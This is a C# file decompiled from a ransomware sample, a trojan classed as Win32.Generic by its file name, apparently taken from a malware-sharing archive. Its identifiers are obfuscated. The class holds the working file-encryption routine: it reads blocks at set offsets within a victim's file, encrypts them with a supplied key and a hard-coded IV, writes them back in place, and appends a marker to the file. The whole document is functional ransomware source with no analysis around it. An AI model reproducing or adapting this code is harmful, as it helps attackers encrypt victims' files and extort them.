// Decompiled with JetBrains decompiler
// Type: sWduCclqEzKrM.rtnpCOxUAdvUXHj
// Assembly: Svchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B0EDCE10-9F20-42C9-8790-E70D370F9841
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.Win32.Generic-9bf0633f41d2962ba5e2895ece2ef9fa7b546ada311ca30f330f0d261a7fb184.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using uuWOPLZnzEM;

namespace sWduCclqEzKrM
{
  internal sealed class rtnpCOxUAdvUXHj
  {
    [NonSerialized]
    internal static GetString \u008D;

    public static int OMuhYeESUKSf([In] long obj0) => (int) obj0;

    public static void sKqjBFIZxTw(
      string AdbIddqYLbyzmz,
      string uCvohvyxcioVPkz,
      string uaGBXxlpLb,
      byte[] sCulHxkoxegjpWJ = null)
    {
      try
      {
        using (FileStream fileStream = new FileStream(AdbIddqYLbyzmz, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
        {
          int num1 = rtnpCOxUAdvUXHj.OMuhYeESUKSf(fileStream.Length) / 3;
          if (num1 < 0)
            num1 *= -1;
          int num2;
          try
          {
            num2 = Convert.ToInt32(uCvohvyxcioVPkz) * Convert.ToInt32(fileStream.Length) / 100;
            if (num2 < 0)
              num2 *= -1;
          }
          catch
          {
            num2 = int.MaxValue;
          }
          if (num1 < num2)
            num2 = num1 - Convert.ToInt32(uCvohvyxcioVPkz) * 1000 * 1000;
          int num3 = 32;
          int NopKiwVaofZW = (int) Math.Round((double) num2 / (double) num3, MidpointRounding.AwayFromZero) * num3;
          for (int index = 0; index < 2; ++index)
          {
            byte[] numArray = rtnpCOxUAdvUXHj.udwlAtPsnCvU(AdbIddqYLbyzmz, fileStream, NopKiwVaofZW, num1 * index);
            byte[] hiMRpHtOQB;
            if (!wJkbnIWOteHAMM.flMhwZmYRAGAlC)
              hiMRpHtOQB = WZCHsryCBLJ.UMjuORBkcFPFXB(numArray, Encoding.ASCII.GetBytes(uaGBXxlpLb), new byte[8]
              {
                (byte) 1,
                (byte) 2,
                (byte) 3,
                (byte) 4,
                (byte) 5,
                (byte) 6,
                (byte) 7,
                (byte) 8
              });
            else
              hiMRpHtOQB = pPEEddGAotfD.hHvJemuiMqqBLp(numArray, Encoding.ASCII.GetBytes(uaGBXxlpLb), new byte[8]
              {
                (byte) 1,
                (byte) 2,
                (byte) 3,
                (byte) 4,
                (byte) 5,
                (byte) 6,
                (byte) 7,
                (byte) 8
              });
            rtnpCOxUAdvUXHj.XumGFZuPbNN(AdbIddqYLbyzmz, fileStream, hiMRpHtOQB, num1 * index);
          }
        }
      }
      catch (Exception ex1)
      {
        if (wJkbnIWOteHAMM.nCZIbbbLUfspycLk)
        {
          try
          {
            File.AppendAllText(wJkbnIWOteHAMM.VjgrxEUFvvHY, rtnpCOxUAdvUXHj.\u008D(107363260) + AdbIddqYLbyzmz + rtnpCOxUAdvUXHj.\u008D(107376006) + ex1.Message + rtnpCOxUAdvUXHj.\u008D(107396392));
          }
          catch (Exception ex2)
          {
          }
        }
      }
      byte[] buffer = wJkbnIWOteHAMM.tRSKQaCWVf ? Encoding.ASCII.GetBytes(wJkbnIWOteHAMM.AJakXHzLGH(rtnpCOxUAdvUXHj.\u008D(107375921)) + wJkbnIWOteHAMM.AJakXHzLGH(rtnpCOxUAdvUXHj.\u008D(107377022)) + Convert.ToString(uCvohvyxcioVPkz) + wJkbnIWOteHAMM.AJakXHzLGH(rtnpCOxUAdvUXHj.\u008D(107377022))) : Encoding.ASCII.GetBytes(wJkbnIWOteHAMM.AJakXHzLGH(rtnpCOxUAdvUXHj.\u008D(107375921)) + wJkbnIWOteHAMM.AJakXHzLGH(rtnpCOxUAdvUXHj.\u008D(107376999)) + Convert.ToString(uCvohvyxcioVPkz) + wJkbnIWOteHAMM.AJakXHzLGH(rtnpCOxUAdvUXHj.\u008D(107376999)));
      if (!wJkbnIWOteHAMM.tRSKQaCWVf)
      {
        using (FileStream fileStream = new FileStream(AdbIddqYLbyzmz, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
          fileStream.Write(buffer, 0, buffer.Length);
      }
      else
      {
        using (FileStream fileStream = new FileStream(AdbIddqYLbyzmz, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
        {
          fileStream.Write(sCulHxkoxegjpWJ, 0, sCulHxkoxegjpWJ.Length);
          fileStream.Write(buffer, 0, buffer.Length);
        }
      }
    }

    public static byte[] udwlAtPsnCvU(
      string wHiYvPLfnuSfIz,
      FileStream IDwWxzCployJjIw,
      int NopKiwVaofZW,
      int NCkEVrvTGC = 0)
    {
      byte[] buffer = new byte[NopKiwVaofZW];
      IDwWxzCployJjIw.Position = (long) NCkEVrvTGC;
      IDwWxzCployJjIw.Read(buffer, 0, NopKiwVaofZW);
      return buffer;
    }

    public static void XumGFZuPbNN(
      string uSOyUJmTruOJGY,
      FileStream VCcSTfEDuiBAKV,
      byte[] hiMRpHtOQB,
      int OnfXerzkZRxyNc = 0)
    {
      VCcSTfEDuiBAKV.Position = (long) OnfXerzkZRxyNc;
      VCcSTfEDuiBAKV.Write(hiMRpHtOQB, 0, hiMRpHtOQB.Length);
    }

    static rtnpCOxUAdvUXHj() => Strings.CreateGetStringDelegate(typeof (rtnpCOxUAdvUXHj));
  }
}
